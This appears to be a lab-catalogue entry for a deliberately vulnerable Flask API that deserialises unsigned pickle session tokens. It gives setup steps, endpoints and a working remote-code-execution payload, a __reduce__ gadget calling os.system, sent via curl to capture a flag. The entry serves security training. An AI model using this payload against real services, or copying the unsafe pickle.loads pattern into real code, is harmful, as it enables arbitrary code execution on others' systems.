Target 15. Deserial-API — REST (Python / Flask, pickle)  ✅ (verified working via native run on this box)

A deliberately vulnerable API whose "remember me" session token is just base64(pickle(dict)) with NO integrity check. The server `pickle.loads()` whatever you send, so a crafted object with a `__reduce__` method runs arbitrary code the moment it is deserialized — Insecure Deserialization leading to Remote Code Execution. This vuln class appears in NONE of the other 10 labs. A flag is planted in the lab folder on startup.

1: Get the repo:   unzip Deserial-API.zip && cd Deserial-API
2: Deploy (native — verified here):  ./run.sh        # (or: python3 app.py)  needs Flask
Open in browser:   http://localhost:9015/           <-- {"app":"Deserial-API",...}
# Baseline: a real login hands you a benign token; send it back to see the round-trip:
#   S=$(curl -s localhost:9015/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"])')
#   curl -s localhost:9015/whoami -H "X-Session: $S"     ->  {"session":{"role":"user","user":"alice"}}
# Quick win (RCE): forge a malicious pickle whose __reduce__ runs a command:
#   E=$(python3 -c "import base64,pickle,os
#   class E:
#    def __reduce__(self): return (os.system, ('id > /tmp/pwned; cat flag.txt >> /tmp/pwned',))
#   print(base64.b64encode(pickle.dumps(E())).decode())")
#   curl -s localhost:9015/whoami -H "X-Session: $E" ; cat /tmp/pwned   ->  uid=... + flag{pickle_deserialization_rce}
3: Stop:  Ctrl-C  (or: kill the app.py process)

Seed user:  alice/alice123 (role=user)

Requirements:
    Python 3 + Flask                (native run — no Docker, no DB)
    curl / Burp + a one-liner to build the pickle payload

Endpoints:
    POST /login   {username,password}  -> returns session = base64(pickle({...}))   [UNSIGNED]
    GET  /whoami  (X-Session header)   -> pickle.loads(base64decode(token))          [RCE SINK]

List of Vulnerabilities (all verified on this box):

    Insecure Deserialization — pickle.loads on attacker-controlled bytes
    Remote Code Execution — a __reduce__ gadget runs os.system(...) during load
    No integrity protection — the session token is unsigned, so any object can be forged
